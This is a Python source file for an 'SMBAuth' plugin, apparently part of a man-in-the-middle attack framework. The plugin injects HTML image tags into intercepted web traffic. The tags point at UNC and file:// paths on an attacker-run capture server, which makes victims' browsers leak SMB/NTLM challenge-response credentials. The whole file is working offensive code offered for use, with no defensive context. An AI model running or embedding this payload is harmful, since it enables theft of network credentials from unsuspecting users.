from plugins.plugin import Plugin
from plugins.Inject import Inject
import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import get_if_addr


class SMBAuth(Inject, Plugin):
    name = "SMBAuth"
    optname = "smbauth"
    desc = "Evoke SMB challenge-response auth attempts"

    def initialize(self, options):
        Inject.initialize(self, options)
        self.target_ip = options.host
        self.html_payload = self._get_data()

        if self.target_ip is None:
            try:
                self.target_ip = get_if_addr(options.interface)
                if self.target_ip == "0.0.0.0":
                    sys.exit("[-] Interface %s does not have an IP address" % options.interface)
            except Exception, e:
                sys.exit("[-] Error retrieving interface IP address: %s" % e)

        print "[*] SMBAuth plugin online"

    def add_options(self, options):
        options.add_argument("--host", type=str, default=None, help="The ip address of your capture server [default: interface IP]")

    def _get_data(self):
        return '<img src=\"\\\\%s\\image.jpg\">'\
                '<img src=\"file://///%s\\image.jpg\">'\
                '<img src=\"moz-icon:file:///%%5c/%s\\image.jpg\">' % tuple([self.target_ip]*3)
